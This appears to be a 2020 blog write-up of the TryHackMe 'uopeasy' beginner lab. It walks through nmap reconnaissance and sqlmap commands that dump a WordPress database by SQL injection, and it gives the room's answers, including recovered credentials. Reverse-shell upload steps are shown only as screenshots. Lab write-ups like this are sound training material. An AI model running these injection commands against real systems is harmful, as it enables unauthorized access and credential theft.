---
title: "uopeasy - TryHackMe"
author: Ludovic COULON
date: 2020-07-18
hero: ./images/hero.jpg
excerpt: "Writeup for the uopeasy university of Portsmouth's beginner room"
---

[TryHackMe | uopeasy](https://tryhackme.com/room/uopeasy)

University of Portsmouth's beginner room.

In this set of tasks you will learn the following:

- Basic SQL injection
- Use of reconnaissance tool
- nmap
- WordPress RCE and reverse shells
- Cracking the hash (John the ripper / hashcat)
- Possibly Nikto
- Burp Suite or dirbuster

The main goal here is to learn as much as possible. Make sure you are connected to our network using your [OpenVPN configuration file](https://tryhackme.com/access).

---

### Setup

```bash
➜  TryHackMe nmap -A -vv 10.10.180.236
```

```bash
80/tcp   open  http     syn-ack Apache httpd 2.4.7 ((Ubuntu))
| http-methods:
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Site doesnt have a title (text/html).

443/tcp  open  ssl/http syn-ack Apache httpd
|_http-favicon: Unknown favicon MD5: A8B5AD142FFA4621B3DBF67BDECA483A
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache
|_http-title: 400 Bad Request
| ssl-cert: Subject: commonName=www.example.com
| Issuer: commonName=www.example.com
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2015-02-17T03:30:05
| Not valid after:  2025-02-14T03:30:05
| MD5:   ebd4 a980 6e51 1b13 769e d4b1 28f9 71dd
| SHA-1: 6297 03e9 f83b 06e7 d50d 3f4b 5bae 38c9 7665 cc64
| -----BEGIN CERTIFICATE-----
| MIIBqzCCARQCCQDg5heFLm8t8jANBgkqhkiG9w0BAQUFADAaMRgwFgYDVQQDDA93
| d3cuZXhhbXBsZS5jb20wHhcNMTUwMjE3MDMzMDA1WhcNMjUwMjE0MDMzMDA1WjAa
| MRgwFgYDVQQDDA93d3cuZXhhbXBsZS5jb20wgZ8wDQYJKoZIhvcNAQEBBQADgY0A
| MIGJAoGBANFjfgmsBCGKWfdqCYZnY2mKvtUnYFtenVjtqdReduE12yavSQZuWAi2
| jIpCUMwG7RG3QAwyzCoMWAzF/tZimI8uNL8G9m84l/wQAbTPMPJTgJXpwY0/9IRc
| hdqtpFoVS251qA9AvPeqMv/hV+rKVAkYcONB6Q8Or8S6ifkEBAZbAgMBAAEwDQYJ
| KoZIhvcNAQEFBQADgYEAQ3Kt0nVDLMkAv9/k1bt6KaM06cvTtiekgu0ugxA0TNXC
| FNIBqu/Fasog43FRLuUtAtNCNMqI5QAAVPatQPk1QmVoE+IxbvxldrKykZk9oXkj
| 5rbE43BAkxyiMvuNsZh7W2Lzx14tlA84c8B4Y1S0CqoVLpaJaCQ5MtVMSya3wAM=
|_-----END CERTIFICATE-----

8080/tcp open  http     syn-ack Apache httpd
|_http-favicon: Unknown favicon MD5: A8B5AD142FFA4621B3DBF67BDECA483A
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
```

![https://imgur.com/9SK08g2.png](https://imgur.com/9SK08g2.png)

![https://imgur.com/G7Wb80W.png](https://imgur.com/G7Wb80W.png)

### #1 Deploy the machine and connect to **our network.**

```bash
No awnser needed
```

### #2 Do some basic reconnaissance on the website. What pages can you view? What ports are open? What can you access?

```bash
No awnser needed
```

### #3 You should have found some additional pages on different ports. What service does the site most likely use for this page?

```bash
mysql
```

### #4 Using the fact that this site has this service running, how can you exploit it? Do not use SQLMap yet..

```bash
Since this is some php room let's say that is SQLi (SQL Injection)
```

```bash
SQLi
```

### #5 Try and return 1 on the page by entering certain characters into the form.

```bash
No awnser needed
```

### #6 Using SQL injection, can you extract the username and password for this form? You may need the help of Burp's intruder function OR SQLMap.

```bash
No awnser needed
```

### #7 What was the username?

Dump the database using sqlmap

```bash
➜  ~ sqlmap -u http://10.10.180.236/login.php --forms -dbs
```

![https://imgur.com/9yukJFN.png](https://imgur.com/9yukJFN.png)

![https://imgur.com/lu0ABlM.png](https://imgur.com/lu0ABlM.png)

Let's see the content of the wordpress8080 table

```bash
➜  ~ sqlmap -u http://10.10.180.236/login.php –forms –dbs –dump-all -D wordpress8080
```

![https://imgur.com/ucY2JNZ.png](https://imgur.com/ucY2JNZ.png)

Credentials retrieved

```bash
Username : admin
Password : SuperSecretPassword
```

### #8 What was the password?

```bash
SuperSecretPassword
```

### #9 Now you have these credentials, where else on the site can you go? Using the credentials you have and another part of the site, login and try to execute remote commands on the server.

```bash
No awnser needed
```

### #10 Can you get a reverse shell back to your local machine?

```bash
No awnser needed
```

### #11 Can you crack anyones password? Using the very popular rockyou.txt

```bash
No awnser needed
```

### #12 What is the final cracked hash password for the user "user"?

Let's upload the reverse shell on the wordpress blog

![https://imgur.com/z6QQkJF.png](https://imgur.com/z6QQkJF.png)

![https://imgur.com/AIcHLNM.png](https://imgur.com/AIcHLNM.png)

![https://imgur.com/9B1RXrg.png](https://imgur.com/9B1RXrg.png)

Nice we have the creds for the database let's try them 😇

![https://imgur.com/csDngND.png](https://imgur.com/csDngND.png)

![https://imgur.com/DElAc2V.png](https://imgur.com/DElAc2V.png)

```bash
SuperSecretPassword
```

<center>
  <a href="https://tryhackme.com/p/boperXD" target="_blank">
    <img src="https://tryhackme-badges.s3.amazonaws.com/boperXD.png" alt="TryhackMeProfile" />
  </a>
</center>
